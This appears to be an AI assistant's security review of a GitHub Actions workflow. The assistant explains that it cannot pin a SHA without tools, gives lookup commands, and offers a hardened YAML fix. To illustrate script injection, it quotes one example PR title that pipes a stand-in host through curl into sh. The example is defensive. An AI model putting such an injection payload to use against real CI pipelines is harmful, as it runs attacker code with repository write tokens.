I haven't pinned anything yet. Two things block me here: I have no shell, so I can't look up a real commit SHA, and I have no edit tool, so I can't change the file. A SHA typed from memory could be wrong or point at the wrong code, so I'm not writing one in.

## What's in the repo

There's one workflow, `.github/workflows/deploy.yml`, and it uses one action:

- `.github/workflows/deploy.yml:13`: `actions/checkout@v4`

No composite actions or reusable workflows are present, so nothing else needs pinning.

## To pin it, run these and send me the output

```sh
gh api repos/actions/checkout/releases/latest --jq '.tag_name + " " + .published_at'
gh api repos/actions/checkout/commits/<TAG_FROM_ABOVE> --jq .sha
```

Use the newest release, not the latest v4. The pin replaces the tag anyway, so it's the right time to move up. If the newest release is a major version past v4, check its release notes for breaking changes first.

You could also run `pinact run` or `ratchet pin` on a clean tree. Either one rewrites every `uses:` to a SHA and keeps the version in a comment. Review the diff afterwards.

## Other problems in this file

Pinning fixes only the smallest issue in this workflow. The rest are more serious:

1. **`permissions: write-all` (line 7)** gives the job a token that can write to almost everything. A pull request from a branch in this repo gets that write token. This job only checks out code and echoes a line, so it needs `contents: read` at most.
2. **Script injection (line 14).** `${{ github.event.pull_request.title }}` is pasted into the shell script before the script runs. A PR titled something like `"; curl evil.sh | sh; echo "` would run that command with the write token above. Pass the title through `env:` instead.
3. **No `persist-credentials: false` on checkout**, so the token stays in `.git/config` for every later step.
4. **No `timeout-minutes`**, so the job can run for the default 6 hours.

Here's the file with all of these fixed. The SHA is still a placeholder until you send me the lookup output:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<40-char-sha> # vX.Y.Z
        with:
          persist-credentials: false
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

The workflow is named `deploy`, but this job doesn't deploy anything. If a real deploy step is supposed to go here, tell me what it does. That step will need its own permissions, and probably shouldn't run on `pull_request` at all.

## Next steps

Send me the SHA output, or turn on shell and file-edit access. Then I'll apply the change and run `actionlint` and `zizmor` on it. Until then, nothing has been changed or verified.
